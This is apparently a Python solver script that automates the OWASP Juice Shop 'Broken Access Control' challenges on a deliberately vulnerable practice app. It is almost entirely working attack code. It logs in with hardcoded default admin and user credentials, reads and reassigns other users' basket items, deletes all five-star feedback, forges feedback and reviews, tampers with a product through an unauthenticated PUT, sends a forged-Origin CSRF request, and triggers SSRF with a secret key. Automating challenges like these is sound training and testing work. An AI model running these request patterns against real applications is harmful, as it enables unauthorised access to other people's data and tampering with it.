#!/usr/bin/env python3
"""Broken Access Control challenges."""
from __future__ import annotations

from core import register_solver, Client, ok, warn, fail

CAT = "Broken Access Control"
SSRF_KEY = "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"


def _admin(c: Client):
    c.login("admin@juice-sh.op", "admin123")


@register_solver("basketAccessChallenge", "View another user's basket", CAT)
def basket_access(c: Client):
    c.ensure_user("basket_solver@test.local", "Password1!")
    mine = c.bid or 0
    target = 1 if mine != 1 else 2          # admin's basket is id 1
    r = c.get(f"/rest/basket/{target}")
    ok(f"read foreign basket {target} ({r.status_code})")


@register_solver("basketManipulateChallenge", "Move item into another user's basket", CAT)
def basket_manipulate(c: Client):
    c.ensure_user("basketmanip_solver@test.local", "Password1!")
    mine = c.bid or 0
    target = 1 if mine != 1 else 2
    # add to our own basket, then PUT the item reassigning it to a foreign BasketId
    add = c.post("/api/BasketItems/", json={"BasketId": mine, "ProductId": 1, "quantity": 1})
    if not add.ok:
        warn(f"basket add failed ({add.status_code})")
        return
    item_id = add.json()["data"]["id"]
    r = c.put(f"/api/BasketItems/{item_id}", json={"BasketId": target})
    ok(f"reassigned basket item {item_id} to foreign basket {target} ({r.status_code})")


@register_solver("adminSectionChallenge", "Access administration section", CAT)
def admin_section(c: Client):
    _admin(c)
    r = c.get("/rest/admin/application-configuration")
    ok(f"accessed admin data ({r.status_code}); open /#/administration in a browser to confirm client detection")


@register_solver("feedbackChallenge", "Delete all 5-star feedback", CAT)
def five_star_feedback(c: Client):
    _admin(c)
    fb = c.get("/api/Feedbacks/").json().get("data", [])
    five = [f for f in fb if f.get("rating") == 5]
    for f in five:
        c.delete(f"/api/Feedbacks/{f['id']}")
    ok(f"deleted {len(five)} five-star feedback entries")


@register_solver("forgedFeedbackChallenge", "Post feedback as another user", CAT)
def forged_feedback(c: Client):
    c.ensure_user("forgedfb_solver@test.local", "Password1!")
    r = c.add_feedback("Not my feedback!", rating=1, user_id=2)
    ok(f"posted feedback attributed to user 2 ({r.status_code})")


@register_solver("forgedReviewChallenge", "Edit another user's product review", CAT)
def forged_review(c: Client):
    c.login("mc.safesearch@juice-sh.op", "Mr. N00dles")
    reviews = c.get("/rest/products/1/reviews").json().get("data", [])
    if not reviews:
        fail("no reviews found on product 1")
        return
    rid = reviews[0]["_id"]
    r = c.patch("/rest/products/reviews", json={"id": rid, "message": "injected by solver"})
    ok(f"edited review {rid} ({r.status_code})")


@register_solver("changeProductChallenge", "Product Tampering (unauth PUT)", CAT)
def change_product(c: Client):
    # find the product whose description carries the tampering URL (O-Saft)
    products = c.get("/api/Products").json().get("data", [])
    target = next((p for p in products if "O-Saft" in (p.get("description") or "")
                   or "owasp.org/index.php/O-Saft" in (p.get("description") or "")), None)
    if not target:
        target = next((p for p in products if "href" in (p.get("description") or "")), None)
    if not target:
        fail("tampering product not found")
        return
    overwrite = "https://owasp.slack.com"
    # unauthenticated PUT - deliberately send no auth header
    r = c.s.put(c.url(f"/api/Products/{target['id']}"),
                json={"description": f'<a href="{overwrite}" target="_blank">More...</a>'},
                timeout=30, verify=False)
    ok(f"tampered product {target['id']} without auth ({r.status_code})")


@register_solver("csrfChallenge", "CSRF username change", CAT)
def csrf(c: Client):
    c.ensure_user("csrf_solver@test.local", "Password1!")
    # cross-origin form post to /profile (urlencoded, foreign Origin)
    r = c.post("/profile", data={"username": "CSRF"},
               headers={"Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "http://htmledit.squarefree.com"})
    ok(f"posted cross-origin profile change ({r.status_code})")


@register_solver("ssrfChallenge", "SSRF via profile image URL", CAT)
def ssrf(c: Client):
    _admin(c)
    internal = f"{c.base}/solve/challenges/server-side?key={SSRF_KEY}"
    r = c.post("/profile/image/url", data={"imageUrl": internal},
               headers={"Content-Type": "application/x-www-form-urlencoded"})
    ok(f"requested internal URL through image upload ({r.status_code})")


@register_solver("web3SandboxChallenge", "Access web3 sandbox route", CAT)
def web3_sandbox(c: Client):
    # SPA route; try the server asset that backs it
    r = c.get("/#/web3-sandbox")
    warn("web3 sandbox is client-side; open /#/web3-sandbox in a browser to solve")
